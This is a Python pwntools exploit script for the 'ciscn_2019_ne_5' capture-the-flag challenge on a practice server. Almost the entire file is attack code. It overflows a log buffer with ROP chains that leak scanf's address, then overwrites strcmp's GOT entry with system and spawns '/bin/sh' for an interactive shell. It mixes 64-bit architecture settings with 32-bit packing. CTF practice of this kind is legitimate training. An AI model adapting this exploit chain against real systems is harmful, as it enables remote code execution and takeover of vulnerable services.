#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ciscn_2019_ne_5'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 27526

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

# info
puts = elf.symbols['puts']
strcmp_got = elf.got['strcmp']
scanf_got = elf.got['__isoc99_scanf']
system = elf.symbols['system']

# gadget
# elf, libc

password = 'administrator'
p.recvuntil('Please input admin password:')
p.sendline(password)

# rop1 - leak scanf (because of bad code x00 in scanf.plt)
len = 76
a_d = 0x08048ABE
ret = elf.symbols['main']

payload = 'A'*72 + p32(a_d)
payload += p32(puts) + p32(ret) + p32(scanf_got)

p.recvuntil('0.Exit\n:')
p.sendline('1')
p.recvuntil('Please input new log info:')
p.sendline(payload)

p.recvuntil('0.Exit\n:')
p.sendline('4')

p.recvuntil(p32(scanf_got)+'\n')

scanf = u32(p.recv(4))

log.info('scanf = ' + hex(scanf))

#rop2 - got overwrite strcmp -> system
p.recvuntil('Please input admin password:')
p.sendline(password)

payload2 = 'b'*72 + p32(a_d)
payload2 += p32(scanf) + p32(ret) + p32(a_d) + p32(strcmp_got)

p.recvuntil('0.Exit\n:')
p.sendline('1')
p.recvuntil('Please input new log info:')
p.sendline(payload2)

p.recvuntil('0.Exit\n:')
# gdb.attach(p)
p.sendline('4')

# strcmp.got <- system
p.sendline(str(system))

# strcmp('/bin/sh','admin...') -> system('/bin/sh')
p.sendline('/bin/sh')

# log.warning('--------------')

p.interactive()

